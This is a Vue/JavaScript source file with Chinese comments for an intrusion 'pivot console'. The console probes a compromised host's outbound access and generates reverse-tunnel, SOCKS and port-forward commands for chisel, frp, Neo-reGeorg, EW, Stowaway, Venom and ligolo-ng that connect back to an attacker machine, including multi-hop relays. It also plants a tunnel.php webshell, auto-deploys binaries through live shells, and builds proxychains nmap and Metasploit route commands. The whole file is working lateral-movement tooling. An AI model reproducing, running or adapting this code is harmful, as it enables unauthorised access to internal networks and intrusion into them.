/* ============================================================
   代理编排台 — 出网探测 / 隧道选型 / 两档自动化 / 统一 Socks / 健康看板
   ============================================================ */
(function (global) {
  'use strict';
  const { reactive, computed, watch } = Vue;
  const S = PivotStore;

  /* ---------- 链路类型 ---------- */
  const LINK_TYPES = [
    { key: 'socks', label: 'Socks 代理', desc: '一条链路覆盖整个网段' },
    { key: 'portfwd', label: '单端口转发', desc: '只暴露某个 IP:端口' },
    { key: 'relay', label: '中继穿透（多级）', desc: '经上层内网口再向内打一层' },
  ];

  /* ---------- 工具命令模板 ----------
     ctx: { lhost 攻击机地址, lport 本地端口, listen 监听端口, bind 绑定地址,
            thost/tport 单端口转发目标, relayAddr/relayPort 中继入口, victim }
  */
  const TOOL_TPL = {
    chisel: {
      server: (c) => '# ① 攻击机（' + c.lhost + '）监听\n./chisel server -p ' + c.listen + ' --reverse\n',
      socks: (c) => './chisel client ' + c.lhost + ':' + c.listen + ' R:' + c.bind + ':' + c.lport + ':socks',
      portfwd: (c) => './chisel client ' + c.lhost + ':' + c.listen + ' R:' + c.bind + ':' + c.lport + ':' + c.thost + ':' + c.tport,
      relay: (c) => './chisel client ' + c.lhost + ':' + c.listen + ' ' + c.listen + ':' + c.listen,
      relaySocks: (c) => './chisel client ' + c.relayAddr + ':' + c.relayPort + ' R:' + c.bind + ':' + c.lport + ':socks',
    },
    frp: {
      server: (c) => '# ① 攻击机（' + c.lhost + '）frps\n[common]\nbind_port = ' + c.listen + '\nauthentication_method = token\ntoken = pivothub\n',
      socks: (c) => '# frpc.ini（' + c.bind + ':' + c.lport + ' → 本段 Socks5）\n[common]\nserver_addr = ' + c.lhost + '\nserver_port = ' + c.listen + '\ntoken = pivothub\n\n[socks5]\ntype = tcp\nremote_port = ' + c.lport + '\nplugin = socks5',
      portfwd: (c) => '# frpc.ini（' + c.bind + ':' + c.lport + ' → ' + c.thost + ':' + c.tport + '）\n[common]\nserver_addr = ' + c.lhost + '\nserver_port = ' + c.listen + '\ntoken = pivothub\n\n[forward]\ntype = tcp\nlocal_ip = ' + c.thost + '\nlocal_port = ' + c.tport + '\nremote_port = ' + c.lport,
      relay: (c) => '# frpc.ini（把内网口 ' + c.listen + ' 映射给下层使用）\n[common]\nserver_addr = ' + c.lhost + '\nserver_port = ' + c.listen + '\ntoken = pivothub\n\n[relay]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = ' + c.listen + '\nremote_port = ' + c.listen,
      relaySocks: (c) => '# 下层 frpc.ini：连到上层内网口 ' + c.relayAddr + ':' + c.relayPort + '\n[common]\nserver_addr = ' + c.relayAddr + '\nserver_port = ' + c.relayPort + '\ntoken = pivothub\n\n[socks5]\ntype = tcp\nremote_port = ' + c.lport + '\nplugin = socks5',
    },
    'Neo-reGeorg': {
      server: (c) => '# ① 攻击机：客户端连到入口马的 tunnel.php\npython3 neoreg.py -k pivothub -u http://' + c.victim + '/upload/tunnel.php -p ' + c.lport + '\n',
      socks: (c) => '# 靶机侧：tunnel.php 写入 Web 目录即可（Socks 由 neoreg 客户端本地提供）\ncp tunnel.php /var/www/html/upload/tunnel.php && chmod 644 /var/www/html/upload/tunnel.php\n# 验证：curl -s http://' + c.victim + '/upload/tunnel.php',
      portfwd: (c) => '# Neo-reGeorg 不擅长单端口转发，建议改用 chisel；如需保留可加 -L ' + c.thost + ':' + c.tport,
      relay: (c) => '# 仅 HTTP 出网时，多级串联需在每层重新放置 tunnel 文件，并用 -r 参数串联',
      relaySocks: (c) => '# 下层：python3 neoreg.py -k pivothub -u http://' + c.relayAddr + '/upload/tunnel.php -p ' + c.lport,
    },
    nps: {
      server: (c) => '# ① 攻击机 nps 服务端（管理台 8080）\n./nps install && nps start\n',
      socks: (c) => './npc -server=' + c.lhost + ':' + c.listen + ' -vkey=pivothub -type=tcp\n# 在管理台新建 SOCKS5 隧道 → 本机 ' + c.lport,
      portfwd: (c) => './npc -server=' + c.lhost + ':' + c.listen + ' -vkey=pivothub -type=tcp\n# 管理台新建 TCP 隧道 ' + c.thost + ':' + c.tport + ' → ' + c.lport,
      relay: (c) => '# nps 支持多客户端接入，下层 npc 连到上层内网口 ' + c.listen,
      relaySocks: (c) => './npc -server=' + c.relayAddr + ':' + c.relayPort + ' -vkey=pivothub -type=tcp',
    },
    EW: {
      server: (c) => '# ① 攻击机 EW 服务端\n./ew_for_linux64 -s rcsocks -l ' + c.lport + ' -e ' + c.listen + '\n',
      socks: (c) => './ew_for_linux64 -s rssocks -d ' + c.lhost + ' -e ' + c.listen,
      portfwd: (c) => './ew_for_linux64 -s lcx_slave -d ' + c.lhost + ' -e ' + c.listen + ' -f ' + c.thost + ' -g ' + c.tport,
      relay: (c) => './ew_for_linux64 -s lcx_tran -l ' + c.listen + ' -f ' + c.lhost + ' -g ' + c.listen,
      relaySocks: (c) => './ew_for_linux64 -s rssocks -d ' + c.relayAddr + ' -e ' + c.relayPort,
    },
    Stowaway: {
      server: (c) => '# ① 攻击机 Stowaway\n./stowaway_admin -l ' + c.listen + '\n# 回连后：socks ' + c.lport + ' start\n',
      socks: (c) => './stowaway_agent ' + c.lhost + ':' + c.listen + '\n# 回连后：socks ' + c.lport + ' start',
      portfwd: (c) => './stowaway_agent ' + c.lhost + ':' + c.listen + '\n# 回连后：forward ' + c.lport + ' ' + c.thost + ' ' + c.tport,
      relay: (c) => '# Stowaway 支持节点级联：下层 agent 连到上层节点\n./stowaway_agent ' + c.lhost + ':' + c.listen,
      relaySocks: (c) => './stowaway_agent ' + c.relayAddr + ':' + c.relayPort,
    },
    Venom: {
      server: (c) => '# ① 攻击机 Venom\n./admin_linux_x64 -lport ' + c.listen + '\n',
      socks: (c) => './agent_linux_x64 -rhost ' + c.lhost + ' -rport ' + c.listen + '\n# 回连后：socks ' + c.lport + ' start',
      portfwd: (c) => './agent_linux_x64 -rhost ' + c.lhost + ' -rport ' + c.listen + '\n# 回连后：lforward ' + c.lport + ' ' + c.thost + ' ' + c.tport,
      relay: (c) => './agent_linux_x64 -rhost ' + c.lhost + ' -rport ' + c.listen + '\n# 回连后：goto 1 → listen ' + c.listen,
      relaySocks: (c) => './agent_linux_x64 -rhost ' + c.relayAddr + ' -rport ' + c.relayPort,
    },
    'ligolo-ng': {
      server: (c) => '# ① 攻击机 ligolo-ng（TUN 模式）\n./proxy -selfcert -laddr 0.0.0.0:' + c.listen + '\n',
      socks: (c) => './agent -connect ' + c.lhost + ':' + c.listen + ' -ignore-cert\n# 回连后：session → ifconfig → start（TUN 直连，无需 socks）',
      portfwd: (c) => './agent -connect ' + c.lhost + ':' + c.listen + ' -ignore-cert\n# 回连后本机：listener_add --addr 0.0.0.0:' + c.lport + ' --to ' + c.thost + ':' + c.tport,
      relay: (c) => '# ligolo 多级：下层 agent 连到上层已建立的 ligolo 监听',
      relaySocks: (c) => './agent -connect ' + c.relayAddr + ':' + c.relayPort + ' -ignore-cert',
    },
  };

  global.Components['proxy-view'] = {
    name: 'ProxyView',
    template: '#tpl-proxy',
    setup() {
      const ui = S.state.ui;
      const timers = {};

      const detect = reactive({
        hostId: ui.detectHostId || (S.state.hosts[1] ? S.state.hosts[1].id : ''),
        running: false,
        done: false,
        probes: (S.state.probes || []).map((p) => Object.assign({}, p)),
        verdict: '',
        recommend: '',
        alt: '',
        reason: '',
      });

      const compose = reactive({
        fromHostId: ui.pivotFrom || (S.state.hosts[1] ? S.state.hosts[1].id : ''),
        tool: 'chisel',
        linkType: 'socks',            /* socks | portfwd | relay */
        direction: '反向',
        attackIp: (S.state.attack && S.state.attack.ip) || '',
        attackPort: 1331,             /* 攻击机监听端口 */
        bindAddr: '0.0.0.0',          /* 靶机端绑定地址 */
        localPort: 10006,             /* 攻击机上暴露的端口 */
        targetHost: '',               /* 单端口转发的目标（选中跳板机后自动填入） */
        targetPort: 80,
        targetSegment: '',
        autoDeploy: false,
        deploying: false,
        tab: 'server',
        serverConf: '',
        targetCmd: '',
        chainConf: '',
        hops: [],
        upstream: null,               /* 推导出的上一层中继信息 */
      });

      const proxy = reactive({ proxychains: '', msf: '' });

      /* 攻击机网络设置（弹窗编辑）：apiMode 下调 PUT /api/attack，服务端回填后命令同步 */
      const attackIface = Vue.ref((S.state.attack && S.state.attack.iface) || '');
      const attackSegment = Vue.ref((S.state.attack && S.state.attack.segment) || '');
      function saveAttack() {
        if (!/^\d+\.\d+\.\d+\.\d+$/.test(compose.attackIp)) {
          S.toast('请输入合法的攻击机 IP', 'err');
          return;
        }
        S.saveAttack({
          ip: compose.attackIp, segment: attackSegment.value, iface: attackIface.value,
        }, () => {
          refreshCmds();
          ui.modal = null;
          S.toast('攻击机网络已更新，命令已按 ' + compose.attackIp + ' 重新生成', 'ok');
        });
      }

      /* 顶栏档位开关与编排面板复选框保持同步 */
      watch(() => compose.autoDeploy, (v) => { proxy.autoMode = v; });

      const links = computed(() => S.state.links);
      const aliveCount = computed(() => S.state.links.filter((l) => l.status === 'alive').length);

      /* ---------- 出网探测 ---------- */
      function runDetect(silent) {
        if (detect.running) return;
        detect.running = true;
        detect.done = false;
        detect.probes.forEach((p) => { p.state = 'idle'; p.progress = 0; p.ms = 0; });
        const host = S.hostOf(compose.fromHostId) || {};
        if (!silent) {
          S.addEvent('proxy', '对 ' + (host.ip || '?') + ' 发起出网探测', {
            hostId: compose.fromHostId, detail: 'ICMP / DNS / HTTP / TCP 四类出站测试',
          });
        }

        /* apiMode：接后端真实探测（POST /api/shells/{id}/probe，逐探针真实执行） */
        if (S.isApiMode && S.isApiMode() && S.probeShell) {
          const shell = S.state.shells.find((s) => s.hostId === compose.fromHostId && s.alive);
          if (!shell) {
            detect.running = false;
            detect.done = false;
            S.toast('该节点暂无可用 Shell，无法真实探测（可先登记 Shell 或切半自动档）', 'err');
            return;
          }
          S.probeShell(shell.id, {}).then((out) => {
            detect.running = false;
            if (!out || !out.ok) {
              detect.done = false;
              S.toast('出网探测未执行：' + ((out && (out.error || out.reason)) || '未知原因'), 'err');
              return;
            }
            (out.probes || []).forEach((p) => {
              const hit = detect.probes.find((x) => x.key === p.key);
              if (hit) {
                hit.state = p.state === 'ok' ? 'ok' : 'fail';
                hit.progress = 100;
                hit.ms = p.ms || 0;
                hit.evidence = p.evidence || '';
                hit.cmd = p.cmd || '';
              }
            });
            detect.done = true;
            detect.verdict = out.verdict || '';
            detect.recommend = out.recommend || '';
            detect.alt = out.alt || '';
            detect.reason = out.reason || '';
            if (!silent) S.toast('探测完成 · 推荐 ' + (out.recommend || '—'), 'ok');
            recommendTool(detect.recommend);
            refreshCmds();
          });
          return;
        }

        detect.probes.forEach((p, i) => {
          timers['p' + i] = setInterval(() => {
            if (p.state === 'idle') p.state = 'run';
            p.progress = Math.min(100, p.progress + 9 + Math.random() * 12);
            if (p.progress >= 100) {
              clearInterval(timers['p' + i]);
              p.progress = 100;
              p.state = p.expect === 'ok' ? 'ok' : 'fail';
              p.ms = p.state === 'ok' ? 30 + Math.round(Math.random() * 120) : 0;
              if (detect.probes.every((x) => x.state === 'ok' || x.state === 'fail')) finishDetect(host, silent);
            }
          }, 130 + i * 40);
        });
      }

      function finishDetect(host, silent) {
        detect.running = false;
        detect.done = true;
        const ok = (k) => { const p = detect.probes.find((x) => x.key === k); return p && p.state === 'ok'; };
        if (ok('TCP') || ok('HTTP')) {
          detect.verdict = '可反向 TCP / HTTP 出网';
          detect.recommend = 'chisel（反向，单文件易上传）';
          detect.alt = 'frp（反向 Socks5，链路更稳）';
          detect.reason = 'TCP 与 HTTP 均可达：单跳用 chisel 一条命令搞定；需要长期稳定多级链时换 frp。';
        } else if (ok('HTTP')) {
          detect.verdict = '仅 HTTP 出网';
          detect.recommend = 'Neo-reGeorg（HTTP 隧道）';
          detect.alt = 'chisel over HTTP';
          detect.reason = '仅 80/443 可达，建议用 Neo-reGeorg 以 Web 请求承载 Socks5 流量。';
        } else if (ok('DNS')) {
          detect.verdict = '仅 DNS 出网';
          detect.recommend = 'iodine / dnscat2（需外部工具编排）';
          detect.alt = '';
          detect.reason = 'TCP/HTTP 均被阻断，仅 DNS 可出，需 DNS 隧道（一期仅提供推荐与编排提示）。';
        } else {
          detect.verdict = '未发现可用出网通道';
          detect.recommend = '考虑正向连接（靶机不可出网，由攻击端主动连入）';
          detect.alt = '或通过已有 L1 代理向本段做正向转发';
          detect.reason = '四类探测全部失败，建议改用正向隧道或复用上层已建立的代理。';
        }
        S.addEvent('proxy', '出网探测完成：' + detect.verdict, {
          hostId: compose.fromHostId, detail: '推荐 ' + detect.recommend + (detect.alt ? ' · 备选 ' + detect.alt : ''),
        });
        if (!silent) S.toast('探测完成 · 推荐 ' + detect.recommend, 'ok');
        recommendTool(detect.recommend);
        refreshCmds();
      }

      /* ---------- 编排 ---------- */
      const nextPort = computed(() => {
        const used = S.state.links.map((l) => Number((l.localSocks || '').split(':')[1]) || 0);
        let p = 10001;
        while (used.indexOf(p) >= 0) p++;
        return p;
      });

      /* 推导该主机能继续向内打的目标网段：
         优先用它自己的第二块网卡（双网卡主机才是纵深跳板），否则按全局网段顺序取下一段 */
      function nextSegmentOf(host) {
        const ifaces = host.ifaces || [];
        if (ifaces.length > 1) {
          const idx = ifaces.findIndex((i) => i.segment === host.segment);
          const next = ifaces[idx >= 0 ? idx + 1 : 1] || ifaces[1];
          if (next) return next.segment;
        }
        const segs = S.state.segments.map((s) => s.segment);
        const gi = segs.indexOf(host.segment);
        return gi >= 0 && gi + 1 < segs.length ? segs[gi + 1] : host.segment;
      }

      /* 找到通往该主机所在网段的上一层代理（用于多级中继推导） */
      function findUpstream(host) {
        return S.state.links.find((l) => l.status === 'alive' && l.targetSegment === host.segment) || null;
      }

      /* 该主机是否双网卡且可通下一层 */
      function isDualHomed(host) {
        return (host.ifaces || []).length > 1;
      }
      /* 取主机在指定网段的地址（找不到就用主 IP） */
      function addrIn(host, segment) {
        const hit = (host.ifaces || []).find((i) => i.segment === segment);
        return hit ? hit.ip : host.ip;
      }

      watch(() => compose.fromHostId, (id) => {
        const host = S.hostOf(id) || {};
        const upstream = findUpstream(host);
        compose.upstream = upstream;
        compose.targetSegment = nextSegmentOf(host);
        /* 该网段必须靠上一层代理才够得着 → 自动切换为多级中继（用户仍可手动改回） */
        if (upstream && compose.linkType !== 'relay') compose.linkType = 'relay';
        /* 单端口转发的默认目标 */
        if (!compose.targetHost || compose.targetHost.indexOf('.') < 0) compose.targetHost = host.ip;
        /* 出网探测随跳板选择自动执行（静默，不打扰） */
        runDetect(true);
        refreshCmds();
      }, { immediate: true });

      watch(
        () => [compose.tool, compose.linkType, compose.attackIp, compose.attackPort,
               compose.bindAddr, compose.localPort, compose.targetHost, compose.targetPort, compose.targetSegment],
        refreshCmds
      );

      function refreshCmds() {
        const host = S.hostOf(compose.fromHostId) || {};
        const relayHost = compose.upstream ? (S.hostOf(compose.upstream.fromHostId) || {}) : {};
        const ctx = {
          lhost: compose.attackIp,
          lport: Number(compose.localPort) || 10001,
          listen: Number(compose.attackPort) || 1331,
          bind: compose.bindAddr || '0.0.0.0',
          thost: compose.targetHost || host.ip,
          tport: Number(compose.targetPort) || 80,
          victim: host.ip,
          relayAddr: compose.upstream ? addrIn(relayHost, host.segment) : '',
          relayPort: compose.upstream ? (compose.upstream.listenPort || 1331) : '',
        };
        const tpl = TOOL_TPL[compose.tool] || TOOL_TPL.chisel;
        compose.serverConf = tpl.server(ctx);
        compose.hops = [];

        if (compose.linkType === 'socks') {
          compose.targetCmd = tpl.socks(ctx);
          compose.chainConf =
            '# 单跳 Socks 代理（本层覆盖 ' + compose.targetSegment + '）\n' +
            '# 攻击机 ' + ctx.lhost + ' 监听 ' + ctx.listen + '；靶机回连并把 socks 暴露在 ' + ctx.bind + ':' + ctx.lport + '\n' +
            '# 之后用 socks5 ' + ctx.lhost + ':' + ctx.lport + ' 访问 ' + compose.targetSegment + ' 内所有资产';
          compose.hops = [
            { role: '攻击机监听', hostId: 'h-attacker', cmd: './chisel server -p ' + ctx.listen + ' --reverse' },
            { role: '跳板机回连（Socks）', hostId: compose.fromHostId, cmd: tpl.socks(ctx) },
          ];
        } else if (compose.linkType === 'portfwd') {
          compose.targetCmd = tpl.portfwd(ctx);
          compose.chainConf =
            '# 单端口转发：' + ctx.thost + ':' + ctx.tport + ' → 攻击机 ' + ctx.lhost + ':' + ctx.lport + '\n' +
            '# 访问方式：http://' + ctx.lhost + ':' + ctx.lport + '/\n' +
            '# 适用：只明确知道某一个 Web 服务，不需要整段代理时最省资源';
          compose.hops = [
            { role: '攻击机监听', hostId: 'h-attacker', cmd: './chisel server -p ' + ctx.listen + ' --reverse' },
            { role: '跳板机回连（端口转发）', hostId: compose.fromHostId, cmd: tpl.portfwd(ctx) },
          ];
        } else {
          /* relay：多级中继穿透 */
          compose.targetCmd = tpl.relaySocks(ctx);
          if (compose.upstream) {
            compose.chainConf =
              '# 多级中继穿透 → 目标网段 ' + compose.targetSegment + '\n' +
              '# 原因：' + host.ip + '（' + (host.hostname || '') + '）无法直接回连攻击机，\n' +
              '#       需先由上层跳板把 ' + ctx.listen + ' 端口暴露到其内网口 ' + ctx.relayAddr + '，再由此节点接入。\n\n' +
              '# 第 1 步：攻击机监听\n./chisel server -p ' + ctx.listen + ' --reverse\n\n' +
              '# 第 2 步：上层跳板（' + relayHost.ip + '）把隧道端口转发到内网口\n' +
              './chisel client ' + ctx.lhost + ':' + ctx.listen + ' ' + ctx.listen + ':' + ctx.listen + '\n\n' +
              '# 第 3 步：本层节点经内网口回连，暴露 Socks 到攻击机 ' + ctx.lport + '\n' +
              './chisel client ' + ctx.relayAddr + ':' + ctx.relayPort + ' R:' + ctx.bind + ':' + ctx.lport + ':socks\n\n' +
              '# 完成后：socks5 ' + ctx.lhost + ':' + ctx.lport + ' → ' + compose.targetSegment;
            compose.hops = [
              { role: '攻击机监听', hostId: 'h-attacker', cmd: './chisel server -p ' + ctx.listen + ' --reverse' },
              { role: '上层跳板中继（暴露内网口）', hostId: compose.upstream.fromHostId, cmd: './chisel client ' + ctx.lhost + ':' + ctx.listen + ' ' + ctx.listen + ':' + ctx.listen },
              { role: '本层双网卡节点回连', hostId: compose.fromHostId, cmd: './chisel client ' + ctx.relayAddr + ':' + ctx.relayPort + ' R:' + ctx.bind + ':' + ctx.lport + ':socks' },
            ];
          } else {
            compose.chainConf =
              '# 本节点可直接回连攻击机，无需中继（自动降级为单跳 Socks）\n' +
              '# 攻击机监听：./chisel server -p ' + ctx.listen + ' --reverse\n' +
              '# 节点回连：' + tpl.socks(ctx);
            compose.hops = [
              { role: '攻击机监听', hostId: 'h-attacker', cmd: './chisel server -p ' + ctx.listen + ' --reverse' },
              { role: '跳板机回连（Socks）', hostId: compose.fromHostId, cmd: tpl.socks(ctx) },
            ];
          }
        }
        compose.targetCmd = compose.targetCmd || '';
      }
      refreshCmds();

      function deploy() {
        if (compose.deploying) return;
        const host = S.hostOf(compose.fromHostId) || {};
        const typeLabel = (LINK_TYPES.find((t) => t.key === compose.linkType) || {}).label || compose.linkType;
        compose.deploying = true;
        const useAuto = compose.autoDeploy;
        if (!useAuto) {
          compose.deploying = false;
          S.toast('已生成配置与命令，请复制到靶机执行', 'ok');
          compose.tab = 'target';
          S.addEvent('proxy', '生成 ' + compose.tool + ' 部署配置（半自动档 · ' + typeLabel + '）', {
            hostId: compose.fromHostId,
            detail: compose.linkType === 'portfwd'
              ? compose.targetHost + ':' + compose.targetPort + ' → ' + compose.attackIp + ':' + compose.localPort
              : 'Socks 入口 ' + compose.attackIp + ':' + compose.localPort + ' · 覆盖 ' + compose.targetSegment,
          });
          return;
        }
        S.addEvent('proxy', '自动档：开始向 ' + (host.ip || '?') + ' 部署 ' + compose.tool, {
          hostId: compose.fromHostId,
          detail: '自动识别 OS/架构（' + (host.os || 'unknown') + '）→ 上传二进制 → 执行 → 等待回连',
        });
        /* 自动档：走后端真实部署（三种链路类型）；失败显式报错，不伪造成功 */
        if (S.isApiMode && S.isApiMode() && S.deployLink) {
          const shell = S.state.shells.find((s) => s.hostId === compose.fromHostId && s.alive) || {};
          const relayHost = compose.upstream
            ? (S.hostOf(compose.upstream.fromHostId) || {}) : {};
          const relayShell = compose.upstream
            ? (S.state.shells.find((s) => s.hostId === compose.upstream.fromHostId && s.alive) || {})
            : {};
          S.deployLink({
            shellId: shell.id,
            relayShellId: relayShell.id || '',
            tool: compose.tool, linkType: compose.linkType,
            attackIp: compose.attackIp, listenPort: Number(compose.attackPort) || 1331,
            bindAddr: compose.bindAddr || '0.0.0.0',
            localPort: Number(compose.localPort) || 10001,
            targetHost: compose.targetHost, targetPort: Number(compose.targetPort) || 0,
            relayAddr: compose.upstream ? addrIn(relayHost, host.segment) : '',
            relayPort: compose.upstream ? (compose.upstream.listenPort || 1331) : 0,
            targetSegment: compose.targetSegment,
          }).then((out) => {
            compose.deploying = false;
            if (out && out.ok) {
              const link = out.link;
              S.toast('回连成功，已登记链路 ' + link.localSocks, 'ok');
              S.addEvent('proxy', compose.tool + ' 回连成功，登记 ProxyLink（' + typeLabel + '）', {
                hostId: compose.fromHostId,
                detail: link.localSocks + ' → ' + (compose.linkType === 'portfwd'
                  ? compose.targetHost + ':' + compose.targetPort
                  : compose.targetSegment)
                  + (out.verify && out.verify.ok ? ' · 隧道内验证通过' : ''),
              });
              compose.localPort = nextPort.value;
              refreshCmds();
              return;
            }
            S.toast('自动档部署失败（阶段 ' + ((out && out.stage) || '?') + '）：'
              + ((out && out.error) || '未知原因') + '，已降级回半自动档', 'err');
            S.addEvent('proxy', '自动档部署失败，降级半自动档', {
              hostId: compose.fromHostId,
              detail: ((out && out.stage) || '') + ' · ' + ((out && out.error) || ''),
            });
            compose.tab = 'target';
          });
          return;
        }
        setTimeout(() => {
          compose.deploying = false;
          const fail = Math.random() < 0.22;
          if (fail) {
            S.toast('自动档部署失败：目标 30s 内未回连（疑似 AV 拦截），已降级回半自动档', 'err');
            S.addEvent('proxy', '自动档部署失败，降级半自动档', {
              hostId: compose.fromHostId,
              detail: '未在 30s 内回连，请手动在虚拟终端执行靶机命令',
            });
            compose.tab = 'target';
            return;
          }
          const link = {
            id: S.rid('p'), tool: compose.tool, linkType: compose.linkType, direction: compose.direction,
            fromHostId: compose.fromHostId,
            toHostId: compose.upstream ? compose.upstream.fromHostId : 'h-attacker',
            listenPort: Number(compose.attackPort) || 1331,
            remoteBind: compose.bindAddr,
            localPort: Number(compose.localPort) || 10001,
            targetHost: compose.linkType === 'portfwd' ? compose.targetHost : undefined,
            targetPort: compose.linkType === 'portfwd' ? Number(compose.targetPort) : undefined,
            localSocks: compose.attackIp + ':' + compose.localPort,
            targetSegment: compose.targetSegment,
            status: 'alive', latency: 30 + Math.round(Math.random() * 90),
            traffic: '0 B', conf: compose.targetCmd.split(/\r?\n/)[0], createdBy: '自动档',
            hops: compose.hops.slice(),
          };
          S.state.links.push(link);
          S.toast('回连成功，已登记链路 ' + link.localSocks, 'ok');
          S.addEvent('proxy', compose.tool + ' 回连成功，登记 ProxyLink（' + typeLabel + '）', {
            hostId: compose.fromHostId,
            detail: link.localSocks + ' → ' + (compose.linkType === 'portfwd'
              ? compose.targetHost + ':' + compose.targetPort
              : compose.targetSegment),
          });
          compose.localPort = nextPort.value;
        }, 1500);
      }

      function genProxychains() {
        const alive = S.state.links.filter((l) => l.status === 'alive' && l.linkType !== 'portfwd');
        const lines = alive.map((l) => 'socks5 ' + (l.localSocks || '').split(':')[0] + ' ' + (l.localSocks || '').split(':')[1]);
        const segs = alive.map((l) => l.targetSegment).filter(Boolean);
        proxy.proxychains =
          'strict_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n\n[ProxyList]\n' +
          (lines.length ? lines.join('\n') : 'socks5 ' + compose.attackIp + ' 10006') +
          '\n\n# 用法：proxychains4 -f /tmp/proxychains.conf nmap -sT -Pn -p- ' +
          (segs[0] || compose.targetSegment);
        S.toast('已生成 proxychains 配置（含 ' + alive.length + ' 级 Socks）', 'ok');
      }
      function genMsf() {
        /* 只对已知目标网段的链路生成 route，缺目标网段的链路跳过 */
        const alive = S.state.links.filter(
          (l) => l.status === 'alive' && l.linkType !== 'portfwd' && l.targetSegment);
        proxy.msf = alive
          .map((l) => {
            const seg = l.targetSegment.replace('.0/24', '.0');
            return 'route add ' + seg + ' 255.255.255.0 ' + (l.localSocks || '').split(':')[1];
          })
          .join('\n') + '\n# msf6 > use post/multi/manage/autoroute\n# msf6 > set SESSION 1\n# msf6 > run';
        S.toast('已生成 msf route 片段', 'ok');
      }

      function checkAll() { S.state.links.forEach((l) => S.testLink(l.id)); S.toast('已发起全部链路健康检查', 'info'); }
      function check(id) { S.testLink(id); }
      function restart(id) { S.restartLink(id); }
      function stop(id) { S.stopLink(id); }
      /* 删除链路记录：先按销毁流程结束进程，再从列表/拓扑移除（不可恢复） */
      function remove(id) {
        const l = S.state.links.find((x) => x.id === id);
        if (!l) return;
        if (!global.confirm('删除链路记录 ' + l.tool + '（' + S.ipOf(l.fromHostId) + ' → ' + S.ipOf(l.toHostId) +
          '）？\n会先按销毁流程结束相关进程，记录不可恢复。')) return;
        S.removeLink(l);
      }

      function sendToTerminal() {
        const text = compose.tab === 'server' ? compose.serverConf : compose.tab === 'target' ? compose.targetCmd : compose.chainConf;
        const target = S.state.shells.find((s) => s.hostId === compose.fromHostId && s.alive) || S.state.shells[0];
        if (!target) { S.toast('没有可用 Shell 会话', 'err'); return; }
        S.state.ui.selectedShellId = target.id;
        S.termState.inited = false;
        S.initTerm();
        text.split(/\r?\n/).filter((l) => l.trim() && !l.trim().startsWith('#')).forEach((l) => S.execCommand(l.trim()));
        S.goto('shell');
        S.toast('已发送到虚拟终端执行', 'ok');
      }

      /* 把某一步命令发送到对应主机的 Shell */
      function sendHop(hop) {
        const shell = S.state.shells.find((s) => s.hostId === hop.hostId && s.alive);
        if (!shell) { S.toast('该节点暂无可用 Shell：' + S.ipOf(hop.hostId), 'err'); return; }
        S.state.ui.selectedShellId = shell.id;
        S.termState.inited = false;
        S.initTerm();
        S.execCommand(hop.cmd);
        S.goto('shell');
      }

      /* 中继入口地址：上一层跳板在「本层网段」里的那个 IP */
      const relayAddr = computed(() => {
        if (!compose.upstream) return '';
        const upHost = S.hostOf(compose.upstream.fromHostId);
        if (!upHost) return '';
        const targetHost = S.hostOf(compose.fromHostId) || {};
        const seg = targetHost.segment || compose.targetSegment;
        return addrIn(upHost, seg) + ':' + (compose.upstream.listenPort || 1331);
      });

      /* ---------- 代理工具设置（MS4：仅 chisel 已接入，其余为下线状态） ---------- */
      const toolCfg = reactive({ list: [], saving: false });

      function enabledToolNames() {
        return (S.state.tools || []).filter((t) => t.enabled).map((t) => t.name);
      }

      /* 只允许落到已启用的工具上；探测推荐了未接入/未启用的工具时回退到第一个可用项 */
      function pickTool(name) {
        const names = enabledToolNames();
        if (name && names.indexOf(name) >= 0) return name;
        return names[0] || 'chisel';
      }

      function recommendTool(recommend) {
        const r = String(recommend || '');
        let want = '';
        if (/chisel/.test(r)) want = 'chisel';
        else if (/frp/.test(r)) want = 'frp';
        else if (/Neo-reGeorg/.test(r)) want = 'Neo-reGeorg';
        const actual = pickTool(want);
        compose.tool = actual;
        if (want && actual !== want) {
          S.toast('探测推荐 ' + want + '（当前为下线状态），已回退到 ' + actual, 'warn');
        }
        return actual;
      }

      function openToolSettings() {
        toolCfg.list = (S.state.tools || []).map((t) => Object.assign({}, t));
        ui.modal = 'tools-cfg';
      }

      function toggleTool(t) {
        if (t.status !== 'online') return; /* 下线工具不可启用 */
        t.enabled = !t.enabled;
      }

      function saveToolSettings() {
        const enabled = toolCfg.list
          .filter((t) => t.enabled && t.status === 'online')
          .map((t) => t.name);
        toolCfg.saving = true;
        S.saveTools(enabled, (ok) => {
          toolCfg.saving = false;
          if (!ok) return;
          ui.modal = null;
          if (enabledToolNames().indexOf(compose.tool) < 0) compose.tool = pickTool(compose.tool);
          refreshCmds();
          S.toast('代理工具设置已保存：' + (enabled.length ? enabled.join(' / ') : '未启用任何工具'), 'ok');
        });
      }

      /* 采纳推荐：把工具/链路类型切到探测结论推荐的方案 */
      function applyRecommend() {
        const r = detect.recommend || '';
        recommendTool(r);
        if (/正向/.test(r)) compose.linkType = 'portfwd';
        refreshCmds();
        ui.modal = null;
        S.toast('已按探测结论切换到 ' + compose.tool + ' / ' + compose.linkType, 'ok');
      }

      return {
        ui, detect, compose, proxy, links, aliveCount, nextPort, linkTypes: LINK_TYPES,
        toolOptions: S.toolOptions, toolCfg,
        hosts: S.state.hosts, attack: S.state.attack,
        icon: global.icon, ipOf: S.ipOf, hostOf: S.hostOf, copy: S.copy,
        isDualHomed, addrIn, relayAddr, applyRecommend,
        openToolSettings, toggleTool, saveToolSettings,
        attackIface, attackSegment, saveAttack,
        runDetect, deploy, genProxychains, genMsf,
        checkAll, check, restart, stop, remove, sendToTerminal, sendHop,
      };
    },
  };
})(window);
